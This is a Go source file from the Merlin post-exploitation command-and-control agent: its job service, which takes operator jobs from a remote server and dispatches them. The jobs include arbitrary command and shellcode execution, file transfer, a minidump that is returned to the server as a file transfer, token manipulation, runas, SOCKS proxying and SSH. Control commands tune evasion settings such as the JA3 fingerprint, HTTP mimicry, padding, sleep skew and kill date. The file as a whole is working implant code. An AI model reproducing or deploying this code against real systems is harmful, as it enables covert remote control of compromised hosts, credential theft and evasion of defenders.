/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Package job is a service to consume, process, and return Agent jobs
package job

import (
	// Standard
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/google/uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/commands"
	"github.com/Ne0nd0g/merlin-agent/v2/services/agent"
	"github.com/Ne0nd0g/merlin-agent/v2/services/client"
	"github.com/Ne0nd0g/merlin-agent/v2/socks"
)

// Service is the structure used to interact with job objects
type Service struct {
	Agent         uuid.UUID
	AgentService  *agent.Service
	ClientService *client.Service
}

// memoryService is an in-memory instantiation of the job service
var memoryService *Service

// in is a channel of incoming or input jobs for the agent to handle
var in = make(chan jobs.Job, 100)

// out is a channel of outgoing job results for the agent to send back to the server
var out = make(chan jobs.Job, 100)

func init() {
	// Start go routine that checks for jobs or tasks to execute
	go execute()
}

// NewJobService is the factory to create a new service for handling Jobs
func NewJobService(agentID uuid.UUID) *Service {
	if memoryService == nil {
		memoryService = &Service{
			Agent:         agentID,
			AgentService:  agent.NewAgentService(),
			ClientService: client.NewClientService(),
		}
	}
	return memoryService
}

// AddResult creates a Job Results structure and places it in the outgoing channel
func (s *Service) AddResult(agent uuid.UUID, stdOut, stdErr string) {
	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.AddResult(): entering into function with agent: %s, stdOut: %s, stdErr: %s", agent, stdOut, stdErr))
	result := jobs.Results{
		Stdout: stdOut,
		Stderr: stdErr,
	}
	job := jobs.Job{
		AgentID: agent,
		Type:    jobs.RESULT,
		Payload: result,
	}
	out <- job
}

// Get blocks waiting for a job from the out channel
func (s *Service) Get() []jobs.Job {
	cli.Message(cli.DEBUG, "services/job.Get(): entering into function")
	job := <-out
	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.Check(): leaving function with: %+v", job))
	return []jobs.Job{job}
}

// Check does not block and returns any jobs ready to be returned to the Merlin server
func (s *Service) Check() (returnJobs []jobs.Job) {
	cli.Message(cli.DEBUG, "services/job.Check(): entering into function")
	// Check the output channel
	for {
		if len(out) > 0 {
			job := <-out
			returnJobs = append(returnJobs, job)
		} else {
			break
		}
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.Check(): Leaving function with %+v", returnJobs))
	return returnJobs
}

// Control handles jobs that have the CONTROL type used to configure the Agent or the network communication client
func (s *Service) Control(job jobs.Job) {
	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.Control(): entering into function with %+v", job))
	cmd := job.Payload.(jobs.Command)
	cli.Message(cli.NOTE, fmt.Sprintf("Received Agent Control Message: %s", cmd.Command))
	var results jobs.Results
	switch strings.ToLower(cmd.Command) {
	case "agentinfo":
		// No action required; End of function gets and returns an Agent information structure
	case "connect":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the \"connect\" command requires 1 argument, the new address, but received %d", len(cmd.Args))
			break
		}
		// Instruct the Agent to connect to the provided target
		err := s.ClientService.Connect(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the client's connection address: %s", err)
		}
	case "exit":
		os.Exit(0)
	case "initialize":
		cli.Message(cli.NOTE, "Received agent re-initialize message")
		s.AgentService.SetAuthenticated(false)
	case "ja3":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the ja3 control command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		err := s.ClientService.SetJA3(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error setting the client's JA3 string:\r\n%s", err.Error())
		}
	case "killdate":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the killdate control command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		d, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer: %s", err)
			break
		}
		s.AgentService.SetKillDate(int64(d))
		cli.Message(cli.INFO, fmt.Sprintf("Set Kill Date to: %s", time.Unix(int64(d), 0).UTC().Format(time.RFC3339)))
	case "listener":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the listener control command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		err := s.ClientService.SetListener(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the Agent's listener ID: %s", err)
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Changing the Agent's Listener ID to %s", cmd.Args[0]))
	case "maxretry":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the maxretry control command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		t, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("There was an error changing the agent max retries: %s", err)
			break
		}
		s.AgentService.SetMaxRetry(t)
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent max retries to %d", t))
	case "padding":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the padding control command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		err := s.ClientService.SetPadding(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the agent message padding size: %s", err)
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent message maximum padding size to %s", cmd.Args[0]))
	case "parrot":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the parrot command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		err := s.ClientService.SetParrot(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error setting the HTTP client's parrot value: %s", err)
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent HTTP client parrot value to %s", cmd.Args[0]))
	case "reset":
		// Reset, or unlink, the client's listener
		err := s.ClientService.Reset()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error resetting the client's listener:%s", err)
			out <- jobs.Job{
				ID:      job.ID,
				AgentID: s.Agent,
				Token:   job.Token,
				Type:    jobs.RESULT,
				Payload: results,
			}
		}
		return
	case "skew":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the skew control command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		t, err := strconv.ParseInt(cmd.Args[0], 10, 64)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the agent skew interval: %s", err)
			break
		}
		s.AgentService.SetSkew(t)
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent skew interval to %d", t))
	case "sleep":
		if len(cmd.Args) < 1 {
			results.Stderr = fmt.Sprintf("the skew control command requires 1 argument but received %d", len(cmd.Args))
			break
		}
		t, err := time.ParseDuration(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the agent waitTime: %s", err)
			break
		}
		s.AgentService.SetSleep(t)
		cli.Message(cli.NOTE, fmt.Sprintf("Setting agent sleep time to %s", cmd.Args[0]))
	default:
		results.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", cmd.Command)
	}

	// Add the result message to the job queue
	// Only one job using the token can be returned, so it is either an error message or the AgentInfo structure
	if results.Stderr != "" {
		out <- jobs.Job{
			ID:      job.ID,
			AgentID: s.Agent,
			Token:   job.Token,
			Type:    jobs.RESULT,
			Payload: results,
		}
		return
	}

	if results.Stderr != "" {
		cli.Message(cli.WARN, results.Stderr)
	}
	if results.Stdout != "" {
		cli.Message(cli.SUCCESS, results.Stdout)
	}

	aInfo := jobs.Job{
		ID:      job.ID,
		AgentID: s.Agent,
		Token:   job.Token,
		Type:    jobs.AGENTINFO,
	}
	aInfo.Payload = s.AgentService.AgentInfo()
	out <- aInfo
	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.Control(): leaving function with %+v", aInfo))
}

// Handle takes a list of jobs and places them into a job channel if they are a valid type, so they can be executed
func (s *Service) Handle(Jobs []jobs.Job) {
	cli.Message(cli.DEBUG, fmt.Sprintf("services/job.Handle(): entering into function with %+v", Jobs))
	for _, job := range Jobs {
		// If the job belongs to this agent
		if job.AgentID == s.Agent {
			cli.Message(cli.SUCCESS, fmt.Sprintf("%s job type received!", job.Type))
			switch job.Type {
			case jobs.FILETRANSFER:
				in <- job
			case jobs.CONTROL:
				s.Control(job)
			case jobs.CMD:
				in <- job
			case jobs.MODULE:
				in <- job
			case jobs.SHELLCODE:
				cli.Message(cli.NOTE, "Received Execute shellcode command")
				in <- job
			case jobs.NATIVE:
				in <- job
			// When AgentInfo or Result messages fail to send, they will circle back through the handler
			case jobs.AGENTINFO:
				out <- job
			case jobs.RESULT:
				out <- job
			case jobs.SOCKS:
				socks.Handler(job, &out)
			default:
				var result jobs.Results
				result.Stderr = fmt.Sprintf("%s is not a valid job type", job.Type)
				out <- jobs.Job{
					ID:      job.ID,
					AgentID: s.Agent,
					Token:   job.Token,
					Type:    jobs.RESULT,
					Payload: result,
				}
			}
		}
	}
	cli.Message(cli.DEBUG, "services/job.Handle(): leaving function")
}

// execute is executed a go routine that regularly checks for jobs from the in channel, executes them, and returns results to the out channel
func execute() {
	for {
		var result jobs.Results
		job := <-in
		// Need a go routine here so that way a job or command doesn't block
		go func(job jobs.Job) {
			switch job.Type {
			case jobs.CMD:
				result = commands.ExecuteCommand(job.Payload.(jobs.Command))
			case jobs.FILETRANSFER:
				if job.Payload.(jobs.FileTransfer).IsDownload {
					result = commands.Download(job.Payload.(jobs.FileTransfer))
				} else {
					ft, err := commands.Upload(job.Payload.(jobs.FileTransfer))
					if err != nil {
						result.Stderr = err.Error()
					}
					out <- jobs.Job{
						AgentID: job.AgentID,
						ID:      job.ID,
						Token:   job.Token,
						Type:    jobs.FILETRANSFER,
						Payload: ft,
					}
				}
			case jobs.MODULE:
				switch strings.ToLower(job.Payload.(jobs.Command).Command) {
				case "clr":
					result = commands.CLR(job.Payload.(jobs.Command))
				case "createprocess":
					result = commands.CreateProcess(job.Payload.(jobs.Command))
				case "link":
					result = commands.Link(job.Payload.(jobs.Command))
				case "listener":
					result = commands.Listener(job.Payload.(jobs.Command))
				case "memfd":
					result = commands.Memfd(job.Payload.(jobs.Command))
				case "memory":
					result = commands.Memory(job.Payload.(jobs.Command))
				case "minidump":
					ft, err := commands.MiniDump(job.Payload.(jobs.Command))
					if err != nil {
						result.Stderr = err.Error()
					}
					out <- jobs.Job{
						AgentID: job.AgentID,
						ID:      job.ID,
						Token:   job.Token,
						Type:    jobs.FILETRANSFER,
						Payload: ft,
					}
				case "netstat":
					result = commands.Netstat(job.Payload.(jobs.Command))
				case "runas":
					result = commands.RunAs(job.Payload.(jobs.Command))
				case "pipes":
					result = commands.Pipes()
				case "ps":
					result = commands.PS()
				case "ssh":
					result = commands.SSH(job.Payload.(jobs.Command))
				case "unlink":
					result = commands.Unlink(job.Payload.(jobs.Command))
				case "uptime":
					result = commands.Uptime()
				case "token":
					result = commands.Token(job.Payload.(jobs.Command))
				default:
					result.Stderr = fmt.Sprintf("unknown module command: %s", job.Payload.(jobs.Command).Command)
				}
			case jobs.NATIVE:
				result = commands.Native(job.Payload.(jobs.Command))
			case jobs.SHELLCODE:
				result = commands.ExecuteShellcode(job.Payload.(jobs.Shellcode))
			case jobs.SOCKS:
				socks.Handler(job, &out)
				return
			default:
				result.Stderr = fmt.Sprintf("Invalid job type: %d", job.Type)
			}
			out <- jobs.Job{
				AgentID: job.AgentID,
				ID:      job.ID,
				Token:   job.Token,
				Type:    jobs.RESULT,
				Payload: result,
			}
		}(job)
	}
}
